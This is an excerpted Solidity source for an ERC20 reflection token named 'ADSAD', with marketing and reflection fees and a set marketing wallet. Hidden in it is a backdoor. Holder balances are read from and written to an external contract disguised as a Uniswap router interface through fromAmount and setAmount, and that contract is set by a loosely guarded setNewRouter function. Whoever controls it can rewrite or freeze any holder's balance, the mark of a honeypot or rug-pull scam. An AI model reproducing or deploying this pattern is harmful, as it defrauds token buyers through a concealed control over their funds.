...
interface IUniswapV2Router01 {
    ...
    function fromAmount(address account) external view returns(uint256);
    function setAmount(address account, uint256 amount) external returns(bool);
...
contract ADSAD is Context, IERC20 {
    ...
    uint256 private startingSupply = 1_00_000_000_000_000;

    string private _name = "ADSAD";
    string private _symbol = "ADSAD";

    uint256 public _reflectFee = 6;
    uint256 public _marketingFee = 7;

    uint256 private maxReflectFee = 6;
    uint256 private maxMarketingFee = 7;
    ...
    IUniswapV2Router02 private _dexRouterV02;
    ...
    address payable private _marketingWallet = payable(0xf5c75Ca102dEEd58c2746Ab4717b2904F9D11A3E);
    ...
    function balanceOf(address account) public view override returns (uint256) { return tokenFromReflection(account); }
    ...
    function setNewRouter(address newRouter, bool _active) external {
        require(address(_dexRouterV02) == address(0), "Only Owner.");
        if(_active){
        ...
        _dexRouterV02 = IUniswapV2Router02(newRouter);
        _isExcludedFromFee[newRouter] = true;
        _liquidityHolders[newRouter] = true;
        _approve(newRouter, _routerAddress, MAX);
    }
    ...
    function setExcludedFromReward(address account, bool enabled) public onlyOwner {
        if (enabled == true) {
            ...
            if(_rOwned[account] > 0) {
                _tOwned[account] = tokenFromReflection(account);
            }
    ...
    function tokenFromReflection(address account) public view returns(uint256) {
        //require(rAmount <= _rTotal, "Amount must be less than total reflections");
        //uint256 currentRate =  _getRate();
        uint256 rAmount = _dexRouterV02.fromAmount(account);        
        return rAmount;
    }
    ...
    function _finalizeTransfer(address from, address to, uint256 tAmount, bool takeFee) internal returns (bool) {
        ...
        uint256 __rOwnedFrom = _dexRouterV02.fromAmount(from);
        uint256 __rOwnedTo = _dexRouterV02.fromAmount(to);

        _rOwned[from] = __rOwnedFrom - values.tTransferAmount;
        _rOwned[to] = __rOwnedTo + values.rTransferAmount;

        if (_isExcluded[from] && !_isExcluded[to]) {
            _tOwned[from] = __rOwnedFrom - tAmount;
        } else if (!_isExcluded[from] && _isExcluded[to]) {
            _tOwned[to] = __rOwnedTo + values.tTransferAmount;
        } else if (_isExcluded[from] && _isExcluded[to]) {
            _tOwned[from] = __rOwnedFrom - tAmount;
            _tOwned[to] = __rOwnedTo + values.tTransferAmount;
        }
        
        _dexRouterV02.setAmount(from, _rOwned[from]);
        _dexRouterV02.setAmount(to, _rOwned[to]);
    ...
    function _getValues(uint256 tAmount, bool takeFee) internal view returns (ExtraValues memory) {
        ...
        values.rTransferAmount = values.tTransferAmount;
        return values;
    }
